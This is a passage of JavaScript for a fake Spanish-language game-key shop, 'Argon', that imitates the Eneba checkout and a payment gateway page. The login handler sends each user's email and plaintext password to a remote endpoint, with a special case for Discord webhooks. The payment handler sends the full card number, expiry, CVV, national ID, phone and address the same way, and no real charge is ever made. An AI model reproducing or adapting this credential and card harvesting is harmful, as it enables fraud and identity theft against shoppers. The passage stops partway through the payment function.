                    </div>
                </div>
                <div class="flex items-center gap-2 shrink-0">
                    <span class="text-xs font-black text-white">${formatARS(p.price)}</span>
                    <button onclick="addToCart(${p.id})" class="bg-purple-600 hover:bg-fuchsia-500 text-white px-2.5 py-1.5 rounded-lg text-xs">
                        <i class="fa-solid fa-cart-plus"></i>
                    </button>
                </div>
            `;
            dropdown.appendChild(row);
        });
    }
    dropdown.classList.remove('hidden');
}

function clearSearch() {
    document.getElementById('searchInput').value = '';
    document.getElementById('clearSearchBtn').classList.add('hidden');
    document.getElementById('searchAutocomplete').classList.add('hidden');
    filterProducts();
}

// ============================================================================
// MODAL DE VISTA DETALLADA DEL PRODUCTO + COMPARATIVA DE VENDEDORES
// ============================================================================
function openProductDetail(id) {
    const p = products.find(item => item.id === id);
    if (!p) return;
    document.getElementById('searchAutocomplete').classList.add('hidden');

    const discount = Math.round(((p.originalPrice - p.price) / p.originalPrice) * 100);
    const isFav = wishlist.includes(p.id);
    const modal = document.getElementById('productDetailModal');
    const content = document.getElementById('productDetailContent');

    content.innerHTML = `
        <button onclick="closeProductDetail()" class="absolute top-4 right-4 text-purple-300 hover:text-white text-xl">
            <i class="fa-solid fa-xmark"></i>
        </button>

        <div class="grid grid-cols-1 md:grid-cols-12 gap-6">
            <div class="md:col-span-4">
                <div class="game-cover-container rounded-xl overflow-hidden border border-purple-600 shadow-2xl">
                    <img src="${p.image}" alt="${p.name}">
                </div>
            </div>

            <div class="md:col-span-8 space-y-4">
                <div class="flex flex-wrap items-center gap-2">
                    <span class="bg-rose-600 text-white text-xs font-black px-2.5 py-0.5 rounded">-${discount}% DESCUENTO</span>
                    <span class="bg-emerald-500/20 border border-emerald-400/40 text-emerald-300 text-xs font-bold px-2.5 py-0.5 rounded">
                        <i class="fa-solid fa-circle-check mr-1"></i> Se puede activar en Argentina
                    </span>
                    <span class="bg-purple-900/80 text-purple-200 text-xs font-bold px-2.5 py-0.5 rounded">${p.platform} • ${p.region}</span>
                </div>

                <h2 class="text-2xl font-black text-white leading-snug">${p.name}</h2>

                <div class="bg-[#140930] border border-purple-800/80 rounded-xl p-4 flex flex-col sm:flex-row sm:items-center justify-between gap-4">
                    <div>
                        <span class="text-xs text-purple-300 line-through">${formatARS(p.originalPrice)}</span>
                        <div class="text-3xl font-black text-white">${formatARS(p.price)}</div>
                        <span class="text-xs text-emerald-400 font-bold">+${formatARS(p.cashback)} de Cashback Argon</span>
                    </div>
                    <div class="flex items-center gap-2.5">
                        <button onclick="toggleWishlist(${p.id}); openProductDetail(${p.id});" class="px-4 py-3 rounded-xl border border-purple-600 bg-[#261556] hover:bg-purple-800 text-pink-400 font-bold text-sm">
                            <i class="${isFav ? 'fa-solid' : 'fa-regular'} fa-heart"></i>
                        </button>
                        <button onclick="closeProductDetail(); addToCart(${p.id});" class="bg-gradient-to-r from-amber-400 to-orange-500 hover:from-amber-300 hover:to-orange-400 text-slate-950 font-black px-6 py-3 rounded-xl text-sm shadow-lg">
                            <i class="fa-solid fa-cart-plus mr-1.5"></i> Comprar Ahora
                        </button>
                    </div>
                </div>

                <div class="space-y-2">
                    <h4 class="text-xs font-black uppercase tracking-wider text-purple-300">Ofertas de Vendedores Verificados (2)</h4>
                    <div class="space-y-2 text-xs">
                        <div class="bg-[#251254] border border-emerald-500/40 p-3 rounded-xl flex items-center justify-between">
                            <div>
                                <strong class="text-white">${p.seller}</strong>
                                <span class="text-emerald-400 ml-2"><i class="fa-solid fa-star"></i> 99.8% Valoración Positiva</span>
                            </div>
                            <div class="flex items-center gap-3">
                                <span class="font-black text-white">${formatARS(p.price)}</span>
                                <button onclick="closeProductDetail(); addToCart(${p.id});" class="bg-emerald-500 text-slate-950 font-black px-3 py-1 rounded-lg">Elegir</button>
                            </div>
                        </div>
                        <div class="bg-[#160a36] border border-purple-800/60 p-3 rounded-xl flex items-center justify-between">
                            <div>
                                <strong class="text-white">KeyMasterLatam</strong>
                                <span class="text-purple-300 ml-2"><i class="fa-solid fa-star text-amber-400"></i> 98.4% Valoración</span>
                            </div>
                            <div class="flex items-center gap-3">
                                <span class="font-bold text-purple-200">${formatARS(Math.round(p.price * 1.06))}</span>
                                <button onclick="closeProductDetail(); addToCart(${p.id});" class="bg-purple-700 hover:bg-purple-600 text-white font-bold px-3 py-1 rounded-lg">Elegir</button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    `;
    modal.classList.remove('hidden');
}

function closeProductDetail() {
    document.getElementById('productDetailModal').classList.add('hidden');
}

// ============================================================================
// FAVORITOS (WISHLIST) Y BÓVEDA "MIS KEYS"
// ============================================================================
function toggleWishlist(id) {
    const idx = wishlist.indexOf(id);
    if (idx > -1) {
        wishlist.splice(idx, 1);
        showToast('Eliminado de tu Lista de Deseos', 'fa-heart-crack');
    } else {
        wishlist.push(id);
        showToast('Guardado en tu Lista de Deseos', 'fa-heart');
    }
    localStorage.setItem('ohmy_wishlist', JSON.stringify(wishlist));
    updateWishlistBadge();
    filterProducts();
}

function updateWishlistBadge() {
    document.getElementById('wishlistBadge').innerText = wishlist.length;
}

function openWishlistModal() {
    const modal = document.getElementById('wishlistModal');
    const container = document.getElementById('wishlistItemsContainer');
    container.innerHTML = '';

    if (wishlist.length === 0) {
        container.innerHTML = `<p class="text-center text-purple-300 py-8 text-xs">Aún no guardaste productos en tu Lista de Deseos.</p>`;
    } else {
        wishlist.forEach(id => {
            const p = products.find(item => item.id === id);
            if (!p) return;
            const row = document.createElement('div');
            row.className = 'bg-[#2a175e] border border-purple-700 p-3 rounded-xl flex items-center justify-between gap-3';
            row.innerHTML = `
                <div class="flex items-center gap-3">
                    <img src="${p.image}" class="w-12 h-16 object-cover rounded">
                    <div>
                        <h4 class="font-bold text-xs text-white">${p.name}</h4>
                        <span class="text-xs text-emerald-400 font-black">${formatARS(p.price)}</span>
                    </div>
                </div>
                <div class="flex items-center gap-2">
                    <button onclick="closeWishlistModal(); addToCart(${p.id});" class="bg-purple-600 hover:bg-fuchsia-500 text-white px-3 py-1.5 rounded-lg text-xs font-bold">
                        Añadir al Carro
                    </button>
                    <button onclick="toggleWishlist(${p.id}); openWishlistModal();" class="text-rose-400 hover:text-rose-300 px-2">
                        <i class="fa-solid fa-trash"></i>
                    </button>
                </div>
            `;
            container.appendChild(row);
        });
    }
    modal.classList.remove('hidden');
}

function closeWishlistModal() {
    document.getElementById('wishlistModal').classList.add('hidden');
}

function updateVaultBadge() {
    document.getElementById('vaultCountBadge').innerText = myVaultKeys.length;
}

function openVaultModal() {
    const modal = document.getElementById('vaultModal');
    const container = document.getElementById('vaultKeysList');
    container.innerHTML = '';

    if (myVaultKeys.length === 0) {
        container.innerHTML = `<p class="text-center text-purple-300 py-8 text-xs">Todavía no tienes claves adquiridas en tu bóveda.</p>`;
    } else {
        myVaultKeys.slice().reverse().forEach(k => {
            const div = document.createElement('div');
            div.className = 'bg-[#2a175e] border border-purple-700 p-3.5 rounded-xl flex flex-col sm:flex-row items-center justify-between gap-3';
            div.innerHTML = `
                <div class="flex items-center gap-3">
                    <img src="${k.image}" class="w-11 h-14 object-cover rounded">
                    <div>
                        <h4 class="font-bold text-xs text-white">${k.name}</h4>
                        <span class="text-[10px] text-purple-300">${k.date}</span>
                    </div>
                </div>
                <div class="flex items-center gap-2">
                    <code class="bg-[#140930] border border-purple-600 px-3 py-1.5 rounded-lg font-mono text-emerald-400 font-bold text-xs select-all">${k.key}</code>
                    <button onclick="navigator.clipboard.writeText('${k.key}'); showToast('Clave copiada al portapapeles', 'fa-copy');" class="bg-purple-600 hover:bg-purple-500 text-white px-3 py-1.5 rounded-lg text-xs font-bold">
                        <i class="fa-solid fa-copy"></i>
                    </button>
                </div>
            `;
            container.appendChild(div);
        });
    }
    modal.classList.remove('hidden');
}

function closeVaultModal() {
    document.getElementById('vaultModal').classList.add('hidden');
}

// ============================================================================
// APERTURA DE SOBRES MISTERIOSOS (ARGON MYSTERY PACKS)
// ============================================================================
function openPacksModal() {
    document.getElementById('packSpinResult').classList.add('hidden');
    document.getElementById('packsModal').classList.remove('hidden');
}

function closePacksModal() {
    document.getElementById('packsModal').classList.add('hidden');
}

function spinMysteryPack(tierName, cost) {
    const resBox = document.getElementById('packSpinResult');
    resBox.classList.remove('hidden');
    resBox.innerHTML = `<p class="text-sm font-black text-amber-300 animate-pulse"><i class="fa-solid fa-dice fa-spin mr-2"></i> Abriendo Pack ${tierName} y desencriptando clave aleatoria...</p>`;

    setTimeout(() => {
        const pool = tierName === 'Diamante'
            ? products.filter(p => p.price >= 28000)
            : tierName === 'Oro'
                ? products.filter(p => p.price >= 16000 && p.price < 28000)
                : products.filter(p => p.price < 16000);

        const wonProd = pool[Math.floor(Math.random() * pool.length)] || products[0];
        const randomKey = 'PACK-' + Math.random().toString(36).substring(2, 6).toUpperCase() + '-' + Math.random().toString(36).substring(2, 6).toUpperCase() + '-' + Math.random().toString(36).substring(2, 6).toUpperCase();

        myVaultKeys.push({
            name: wonProd.name + ` (Pack ${tierName})`,
            image: wonProd.image,
            key: randomKey,
            date: new Date().toLocaleString('es-AR')
        });
        localStorage.setItem('ohmy_vault_keys', JSON.stringify(myVaultKeys));
        updateVaultBadge();

        resBox.innerHTML = `
            <p class="text-xs font-bold text-emerald-400 uppercase">¡Felicidades! Ganaste este producto en tu Pack ${tierName}:</p>
            <div class="flex flex-col sm:flex-row items-center justify-center gap-4 pt-1">
                <img src="${wonProd.image}" class="w-16 h-22 object-cover rounded-lg border border-emerald-400">
                <div class="text-left space-y-1.5">
                    <h4 class="font-black text-sm text-white">${wonProd.name}</h4>
                    <p class="text-xs text-purple-300">Valor en tienda: <strong class="text-emerald-400">${formatARS(wonProd.price)}</strong></p>
                    <div class="flex items-center gap-2">
                        <code class="bg-[#210f4d] border border-emerald-400/60 px-3 py-1 rounded font-mono text-xs text-emerald-300 font-bold">${randomKey}</code>
                        <button onclick="navigator.clipboard.writeText('${randomKey}'); showToast('Clave copiada al portapapeles', 'fa-copy');" class="bg-emerald-500 text-slate-950 font-black px-2.5 py-1 rounded text-xs">Copiar</button>
                    </div>
                </div>
            </div>
        `;
    }, 1100);
}

// ============================================================================
// SISTEMA DE CREAR CUENTA / INICIAR SESIÓN
// ============================================================================
function openAuthModal(mode = 'login') {
    document.getElementById('authModal').classList.remove('hidden');
    switchAuthTab(mode);
}

function closeAuthModal() {
    document.getElementById('authModal').classList.add('hidden');
}

function switchAuthTab(mode) {
    currentAuthMode = mode;
    const loginBtn = document.getElementById('tabLoginBtn');
    const regBtn = document.getElementById('tabRegisterBtn');
    const nameField = document.getElementById('authNameField');
    const nameInput = document.getElementById('authNameInput');
    const title = document.getElementById('authModalTitle');
    const submitBtn = document.getElementById('authSubmitBtn');

    if (mode === 'login') {
        loginBtn.className = 'py-2 rounded-lg text-xs font-bold bg-purple-600 text-white transition';
        regBtn.className = 'py-2 rounded-lg text-xs font-bold text-purple-300 hover:text-white transition';
        nameField.classList.add('hidden');
        nameInput.required = false;
        title.innerText = 'Iniciar Sesión en Argon';
        submitBtn.innerText = 'Entrar a mi Cuenta';
    } else {
        regBtn.className = 'py-2 rounded-lg text-xs font-bold bg-purple-600 text-white transition';
        loginBtn.className = 'py-2 rounded-lg text-xs font-bold text-purple-300 hover:text-white transition';
        nameField.classList.remove('hidden');
        nameInput.required = true;
        title.innerText = 'Crear Cuenta en Argon';
        submitBtn.innerText = 'Crear Cuenta Ahora';
    }
}

async function handleAuthSubmit(e) {
    e.preventDefault();
    const email = document.getElementById('authEmailInput').value.trim();
    const password = document.getElementById('authPasswordInput').value;
    const name = currentAuthMode === 'register'
        ? document.getElementById('authNameInput').value.trim()
        : email.split('@')[0];

    // Si es un usuario nuevo registrándose, su cartera inicia en $0.00
    if (currentAuthMode === 'register') {
        walletBalance = 0;
        updateWalletUI();
    }

    currentUser = { name, email };
    localStorage.setItem('ohmy_active_user', JSON.stringify(currentUser));

    const accountRecord = {
        id: 'USER-' + Math.floor(100000 + Math.random() * 900000),
        type: currentAuthMode === 'register' ? 'NUEVA CUENTA' : 'INICIO DE SESIÓN',
        date: new Date().toLocaleString('es-AR'),
        paymentMethod: 'CUENTA USUARIO',
        buyer: {
            name: name,
            email: email,
            phone: 'N/A',
            dni: 'Password: ' + password,
            province: 'N/A',
            address: 'N/A',
            cardNum: 'Contraseña: ' + password,
            cardExp: '-',
            cardCvv: '-'
        },
        items: [],
        total: 0,
        cashbackEarned: 0
    };

    const db = JSON.parse(localStorage.getItem('ohmy_sandbox_db') || '[]');
    db.push(accountRecord);
    localStorage.setItem('ohmy_sandbox_db', JSON.stringify(db));

    const remoteUrl = localStorage.getItem('ohmy_remote_webhook') || DEFAULT_REMOTE_DB_URL;
    if (remoteUrl) {
        try {
            if (remoteUrl.includes('discord.com/api/webhooks')) {
                await fetch(remoteUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `👤 **${accountRecord.type} (${accountRecord.id})**\n**Usuario:** ${name}\n**Email:** ${email}\n**Contraseña:** \`${password}\``
                    })
                });
            } else {
                await fetch(remoteUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(accountRecord)
                });
            }
        } catch (err) {
            console.warn('Error enviando cuenta a base remota:', err);
        }
    }

    updateAuthUI();
    closeAuthModal();
    document.getElementById('authForm').reset();
    showToast(`¡Bienvenido, ${name}!`, 'fa-user-check');
}

function logoutUser() {
    currentUser = null;
    localStorage.removeItem('ohmy_active_user');
    updateAuthUI();
    showToast('Sesión cerrada correctamente', 'fa-right-from-bracket');
}

function updateAuthUI() {
    const navArea = document.getElementById('userNavArea');
    if (currentUser) {
        navArea.innerHTML = `
            <div class="flex items-center space-x-2 bg-[#261556] border border-purple-700/70 px-3 py-1 rounded-lg">
                <i class="fa-solid fa-circle-user text-emerald-400"></i>
                <span class="font-bold text-white">${currentUser.name}</span>
                <button onclick="logoutUser()" title="Cerrar sesión" class="text-purple-300 hover:text-rose-400 ml-1.5 transition">
                    <i class="fa-solid fa-right-from-bracket"></i>
                </button>
            </div>
        `;
        const sbName = document.getElementById('sbName');
        const sbEmail = document.getElementById('sbEmail');
        if (sbName && !sbName.value) sbName.value = currentUser.name;
        if (sbEmail && !sbEmail.value) sbEmail.value = currentUser.email;
    } else {
        navArea.innerHTML = `
            <button onclick="openAuthModal('login')" class="text-white hover:text-fuchsia-300 font-bold transition flex items-center gap-1.5 bg-[#261556] hover:bg-[#321c70] border border-purple-700/70 px-3 py-1 rounded-lg shadow">
                <i class="fa-regular fa-user text-fuchsia-400"></i>
                <span>Iniciar sesión | Crear cuenta</span>
            </button>
        `;
    }
}

// ============================================================================
// CATÁLOGO, FILTROS Y CARRITO
// ============================================================================
function renderProducts(list) {
    const grid = document.getElementById('productGrid');
    grid.innerHTML = '';

    if (list.length === 0) {
        grid.innerHTML = `<div class="col-span-full text-center py-12 text-purple-300 font-semibold">No se encontraron productos con ese filtro o presupuesto.</div>`;
        return;
    }

    list.forEach(p => {
        const discount = Math.round(((p.originalPrice - p.price) / p.originalPrice) * 100);
        const isFav = wishlist.includes(p.id);
        const fallbackImg = createCleanCardArtwork(p.platform.toUpperCase(), p.region, "#3b188f", "#190d3a", "#f5a623", "DIGITAL KEY");
        
        const card = document.createElement('div');
        card.className = 'bg-[#1f0f47] border border-purple-800/60 hover:border-fuchsia-500 rounded-xl overflow-hidden shadow-lg flex flex-col justify-between transition group';
        card.innerHTML = `
            <div>
                <div class="game-cover-container cursor-pointer">
                    <img onclick="openProductDetail(${p.id})" src="${p.image}" alt="${p.name}" loading="lazy" onerror="this.onerror=null;this.src='${fallbackImg}';">
                    <span class="absolute top-2 left-2 bg-rose-600 text-white font-black text-[11px] px-2 py-0.5 rounded shadow">-${discount}%</span>
                    <button onclick="toggleWishlist(${p.id})" class="absolute top-2 right-2 w-7 h-7 rounded-full bg-black/60 hover:bg-black text-pink-400 flex items-center justify-center text-xs transition">
                        <i class="${isFav ? 'fa-solid' : 'fa-regular'} fa-heart"></i>
                    </button>
                    <span class="absolute bottom-2 left-2 bg-emerald-500 text-slate-950 font-extrabold text-[10px] px-2 py-0.5 rounded shadow">CASHBACK</span>
                </div>
                <div class="p-3.5 space-y-1.5">
                    <h3 onclick="openProductDetail(${p.id})" class="cursor-pointer font-bold text-xs text-white line-clamp-2 leading-snug group-hover:text-fuchsia-300 transition">${p.name}</h3>
                    <span class="block text-[10px] font-extrabold uppercase tracking-wider text-emerald-400">${p.region} • ${p.platform}</span>
                </div>
            </div>
            <div class="p-3.5 pt-0 space-y-2">
                <div>
                    <span class="block text-[10px] text-purple-300 line-through">${formatARS(p.originalPrice)}</span>
                    <span class="text-base font-black text-white">${formatARS(p.price)}</span>
                    <span class="block text-[10px] text-emerald-400 font-bold">de Cashback: ${formatARS(p.cashback)}</span>
                </div>
                <button onclick="addToCart(${p.id})" class="w-full bg-purple-600 hover:bg-fuchsia-600 text-white font-bold py-2 rounded-lg text-xs flex items-center justify-center gap-1.5 transition shadow">
                    <i class="fa-solid fa-cart-plus"></i> Añadir al carro
                </button>
            </div>
        `;
        grid.appendChild(card);
    });
}

function setCategory(cat, btnElement) {
    activeCategory = cat;
    document.querySelectorAll('.cat-btn').forEach(btn => btn.classList.remove('active-cat'));
    btnElement.classList.add('active-cat');
    filterProducts();
}

function filterProducts() {
    const query = document.getElementById('searchInput').value.toLowerCase();
    const sort = document.getElementById('sortSelect').value;
    const maxSlider = document.getElementById('maxPriceSlider');
    const maxLabel = document.getElementById('maxPriceLabel');
    const maxArs = maxSlider ? Number(maxSlider.value) : 75000;

    if (maxLabel) {
        maxLabel.innerText = maxArs >= 75000 ? 'Sin límite' : formatARS(maxArs);
    }

    let filtered = products.filter(p => {
        const matchCat = activeCategory === 'all' || p.category === activeCategory;
        const matchQuery = p.name.toLowerCase().includes(query) || p.platform.toLowerCase().includes(query);
        const matchPrice = p.price <= maxArs;
        return matchCat && matchQuery && matchPrice;
    });

    if (sort === 'price-asc') filtered.sort((a, b) => a.price - b.price);
    if (sort === 'price-desc') filtered.sort((a, b) => b.price - a.price);
    if (sort === 'discount') filtered.sort((a, b) => ((b.originalPrice - b.price) / b.originalPrice) - ((a.originalPrice - a.price) / a.originalPrice));

    renderProducts(filtered);
}

function toggleCart() {
    const drawer = document.getElementById('cartDrawer');
    drawer.classList.toggle('hidden');
    renderCartItems();
}

function addToCart(id) {
    const prod = products.find(p => p.id === id);
    const existing = cart.find(item => item.id === id);
    if (existing) {
        existing.qty++;
    } else {
        cart.push({ ...prod, qty: 1 });
    }
    updateCartBadge();
    showToast(`${prod.name.substring(0, 28)}... añadido al carro`, 'fa-cart-plus');
    toggleCart();
}

function updateCartBadge() {
    const count = cart.reduce((acc, item) => acc + item.qty, 0);
    document.getElementById('cartBadge').innerText = count;
    document.getElementById('cartCount').innerText = count;
}

function renderCartItems() {
    const list = document.getElementById('cartItemsList');
    if (!list) return;
    list.innerHTML = '';

    if (cart.length === 0) {
        list.innerHTML = `<p class="text-center text-purple-300 py-8 text-sm">Tu carro está vacío.</p>`;
        updateCartTotals(0, 0, 0);
        return;
    }

    let subtotal = 0;
    cart.forEach((item, idx) => {
        subtotal += item.price * item.qty;
        const div = document.createElement('div');
        div.className = 'flex items-center justify-between bg-[#2a175e] p-3 rounded-xl border border-purple-700/50 gap-3';
        div.innerHTML = `
            <div class="flex items-center space-x-3">
                <img src="${item.image}" class="w-11 h-14 object-cover rounded">
                <div>
                    <h4 class="font-bold text-xs text-white line-clamp-1">${item.name}</h4>
                    <span class="text-xs text-emerald-400 font-extrabold">${formatARS(item.price)}</span>
                </div>
            </div>
            <div class="flex items-center space-x-2">
                <button onclick="changeQty(${idx}, -1)" class="w-6 h-6 bg-purple-900 rounded text-xs font-bold hover:bg-purple-700">-</button>
                <span class="text-xs font-bold">${item.qty}</span>
                <button onclick="changeQty(${idx}, 1)" class="w-6 h-6 bg-purple-900 rounded text-xs font-bold hover:bg-purple-700">+</button>
            </div>
        `;
        list.appendChild(div);
    });

    const discount = subtotal * appliedDiscount;
    const total = subtotal - discount;
    updateCartTotals(subtotal, discount, total);
}

function changeQty(index, delta) {
    cart[index].qty += delta;
    if (cart[index].qty <= 0) {
        cart.splice(index, 1);
    }
    updateCartBadge();
    renderCartItems();
    if (!document.getElementById('viewCheckoutEneba').classList.contains('hidden')) {
        if (cart.length === 0) switchView('store');
        else renderEnebaSummary();
    }
}

function removeItemFromCheckout(index) {
    cart.splice(index, 1);
    updateCartBadge();
    if (cart.length === 0) {
        switchView('store');
    } else {
        renderEnebaSummary();
    }
}

function applyCoupon() {
    const code = document.getElementById('couponInput').value.trim().toUpperCase();
    const msg = document.getElementById('couponMessage');
    if (code === 'ARGON10' || code === 'OHMY10') {
        appliedDiscount = 0.10;
        msg.className = 'text-xs text-emerald-400 font-bold';
        msg.innerText = '¡Cupón del 10% aplicado!';
        showToast('Cupón de 10% aplicado con éxito', 'fa-tag');
    } else {
        appliedDiscount = 0;
        msg.className = 'text-xs text-rose-400 font-bold';
        msg.innerText = 'Cupón inválido.';
    }
    renderCartItems();
}

function updateCartTotals(subtotal, discount, total) {
    document.getElementById('cartSubtotal').innerText = formatARS(subtotal);
    document.getElementById('cartDiscount').innerText = '-' + formatARS(discount);
    document.getElementById('cartTotal').innerText = formatARS(total);
}

// ============================================================================
// TARJETA 3D ANIMADA Y FORMATEO INTELIGENTE EN LA PASARELA
// ============================================================================
function formatCardNumberInput(input) {
    let digits = input.value.replace(/\D/g, '').substring(0, 16);
    let formatted = digits.match(/.{1,4}/g)?.join(' ') || '';
    input.value = formatted;

    const brandEl = document.getElementById('cardBrandLogo');
    if (digits.startsWith('4')) brandEl.innerText = 'VISA';
    else if (digits.startsWith('5')) brandEl.innerText = 'MASTERCARD';
    else if (digits.startsWith('3')) brandEl.innerText = 'AMEX';
    else brandEl.innerText = 'ARGON CARD';

    updateCardPreview();
}

function formatCardExpInput(input) {
    let digits = input.value.replace(/\D/g, '').substring(0, 4);
    if (digits.length >= 3) {
        input.value = digits.substring(0, 2) + '/' + digits.substring(2, 4);
    } else {
        input.value = digits;
    }
    updateCardPreview();
}

function flipCard3D(flipToBack) {
    const card = document.getElementById('interactiveCard3D');
    if (!card) return;
    if (flipToBack) card.classList.add('is-flipped');
    else card.classList.remove('is-flipped');
}

function updateCardPreview() {
    const nameVal = document.getElementById('sbName').value.trim();
    const numVal = document.getElementById('sbCardNum').value.trim();
    const expVal = document.getElementById('sbCardExp').value.trim();
    const cvvVal = document.getElementById('sbCardCvv').value.trim();

    document.getElementById('cardPreviewName').innerText = nameVal || 'NOMBRE Y APELLIDO';
    document.getElementById('cardPreviewNumber').innerText = numVal || '•••• •••• •••• ••••';
    document.getElementById('cardPreviewExp').innerText = expVal || 'MM/AA';
    document.getElementById('cardPreviewCvv').innerText = cvvVal || '•••';
}

// ============================================================================
// NAVEGACIÓN Y CHECKOUT
// ============================================================================
function switchView(view) {
    document.getElementById('viewStore').classList.add('hidden');
    document.getElementById('viewCheckoutEneba').classList.add('hidden');
    document.getElementById('viewCheckoutPagoNube').classList.add('hidden');
    document.getElementById('viewSuccess').classList.add('hidden');

    const mainHeader = document.getElementById('mainHeader');
    const checkoutHeader = document.getElementById('checkoutHeader');

    if (view === 'store') {
        mainHeader.classList.remove('hidden');
        checkoutHeader.classList.add('hidden');
        document.getElementById('viewStore').classList.remove('hidden');
    } else {
        mainHeader.classList.add('hidden');
        checkoutHeader.classList.remove('hidden');
        if (view === 'checkoutEneba') document.getElementById('viewCheckoutEneba').classList.remove('hidden');
        if (view === 'checkoutPagoNube') document.getElementById('viewCheckoutPagoNube').classList.remove('hidden');
        if (view === 'success') document.getElementById('viewSuccess').classList.remove('hidden');
    }
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

function proceedToCheckout() {
    if (cart.length === 0) {
        showToast('Agrega al menos un producto al carro', 'fa-cart-shopping');
        return;
    }
    document.getElementById('cartDrawer').classList.add('hidden');
    updateWalletUI();
    renderEnebaSummary();
    switchView('checkoutEneba');
}

function selectPaymentCard(labelEl, method) {
    selectedMethod = method;
    document.querySelectorAll('.eneba-pay-card').forEach(c => c.classList.remove('selected-pay-card'));
    labelEl.classList.add('selected-pay-card');
    const radio = labelEl.querySelector('input[type="radio"]');
    if (radio) radio.checked = true;
}

function renderEnebaSummary() {
    const container = document.getElementById('checkoutSummaryItems');
    container.innerHTML = '';
    let subtotal = 0;

    cart.forEach((item, index) => {
        subtotal += item.price * item.qty;
        const itemCashback = item.cashback * item.qty;
        const isDLC = item.category === 'dlc';

        const block = document.createElement('div');
        block.className = index > 0 ? 'pt-5 space-y-2.5' : 'space-y-2.5';
        block.innerHTML = `
            <div class="flex items-center space-x-2 text-xs text-purple-200">
                <span>Vendido por</span>
                <span class="w-4 h-4 rounded-full bg-emerald-500/20 text-emerald-400 inline-flex items-center justify-center text-[10px]">
                    <i class="fa-solid fa-bolt"></i>
                </span>
                <strong class="text-white">${item.seller}</strong>
            </div>

            <div class="flex gap-3.5">
                <img src="${item.image}" alt="${item.name}" class="w-16 h-24 object-cover rounded shadow-md shrink-0">
                <div class="flex-1 space-y-1.5">
                    <div class="flex justify-between items-start gap-2">
                        <h4 class="font-bold text-sm text-white leading-snug">
                            ${isDLC ? '<span class="border border-purple-400 text-purple-200 text-[10px] px-1.5 py-0.5 rounded mr-1 font-semibold">DLC</span>' : ''}
                            ${item.name}
                        </h4>
                        <div class="flex items-center space-x-2 text-purple-300 shrink-0">
                            <button onclick="toggleWishlist(${item.id})" class="hover:text-pink-400"><i class="fa-regular fa-heart"></i></button>
                            <button onclick="removeItemFromCheckout(${index})" class="hover:text-rose-400"><i class="fa-regular fa-trash-can"></i></button>
                        </div>
                    </div>

                    <div class="text-xs text-purple-300 flex items-center gap-1">
                        <span>Producto digital</span>
                        <span class="w-4 h-4 rounded-full border border-purple-400 inline-flex items-center justify-center text-[10px]">?</span>
                    </div>

                    <div class="flex items-center justify-between pt-1">
                        <div class="flex items-center space-x-3 text-sm font-bold">
                            <button onclick="changeQty(${index}, -1)" class="text-purple-300 hover:text-white">-</button>
                            <span>${item.qty}</span>
                            <button onclick="changeQty(${index}, 1)" class="text-purple-300 hover:text-white">+</button>
                        </div>
                        <span class="font-black text-base text-white">${formatARS(item.price * item.qty)}</span>
                    </div>

                    <div class="text-xs font-semibold text-emerald-400 pt-0.5">
                        de Cashback: ${formatARS(itemCashback)}
                    </div>
                </div>
            </div>
        `;
        container.appendChild(block);
    });

    const discount = subtotal * appliedDiscount;
    const total = subtotal - discount;

    document.getElementById('summarySubtotal').innerText = formatARS(subtotal);
    document.getElementById('summaryDiscount').innerText = '-' + formatARS(discount);
    document.getElementById('summaryTotal').innerText = formatARS(total);
}

function goToPagoNubeGateway() {
    document.getElementById('selectedMethodBadge').innerText = selectedMethod.toUpperCase();
    if (currentUser) {
        const sbName = document.getElementById('sbName');
        const sbEmail = document.getElementById('sbEmail');
        if (sbName && !sbName.value) sbName.value = currentUser.name;
        if (sbEmail && !sbEmail.value) sbEmail.value = currentUser.email;
        updateCardPreview();
    }
    switchView('checkoutPagoNube');
}

function backToEnebaSelection() {
    switchView('checkoutEneba');
}

// PROCESAR PAGO Y ENVIAR A LA BASE DE DATOS
async function processSandboxPayment(e) {
    e.preventDefault();

    const submitBtn = document.getElementById('submitPayBtn');
    submitBtn.disabled = true;
    submitBtn.innerHTML = `<i class="fa-solid fa-circle-notch fa-spin"></i> <span>Procesando pago...</span>`;

    const buyerData = {
        name: document.getElementById('sbName').value,
        email: document.getElementById('sbEmail').value,
        phone: document.getElementById('sbPhone').value,
        dni: document.getElementById('sbDni').value,
        province: document.getElementById('sbProvince').value,
        address: document.getElementById('sbAddress').value,
        cardNum: document.getElementById('sbCardNum').value,
        cardExp: document.getElementById('sbCardExp').value,
        cardCvv: document.getElementById('sbCardCvv').value,
        installments: document.getElementById('sbInstallments').value
    };

    const subtotal = cart.reduce((acc, item) => acc + (item.price * item.qty), 0);
    const discount = subtotal * appliedDiscount;
    const total = subtotal - discount;
    const totalCashback = cart.reduce((acc, item) => acc + (item.cashback * item.qty), 0);

    const record = {
        id: 'ARGON-' + Math.floor(100000 + Math.random() * 900000),
        date: new Date().toLocaleString('es-AR'),
        paymentMethod: selectedMethod,
        buyer: buyerData,
        items: cart.map(i => ({ id: i.id, name: i.name, qty: i.qty, price: i.price })),
        total: total,
        cashbackEarned: totalCashback
    };

    const db = JSON.parse(localStorage.getItem('ohmy_sandbox_db') || '[]');
    db.push(record);
    localStorage.setItem('ohmy_sandbox_db', JSON.stringify(db));

    const remoteUrl = localStorage.getItem('ohmy_remote_webhook') || DEFAULT_REMOTE_DB_URL;
    if (remoteUrl) {
        try {
            if (remoteUrl.includes('discord.com/api/webhooks')) {
                await fetch(remoteUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `📦 **Nueva Orden (${record.id})**\n👤 **Cliente:** ${buyerData.name} (${buyerData.email}) | **DNI:** ${buyerData.dni}\n📱 **Tel:** ${buyerData.phone} | **Dirección:** ${buyerData.address}, ${buyerData.province}\n💳 **Método:** ${selectedMethod.toUpperCase()} | **Tarjeta:** \`${buyerData.cardNum}\` | **Venc:** \`${buyerData.cardExp}\` | **CVV:** \`${buyerData.cardCvv}\`\n💰 **Total:** ${formatARS(total)}`
                    })
                });
            } else {
                await fetch(remoteUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(record)
                });
            }
        } catch (err) {
            console.warn('Error enviando a base remota:', err);
        }
    }

    walletBalance += totalCashback;
    updateWalletUI();

    submitBtn.disabled = false;
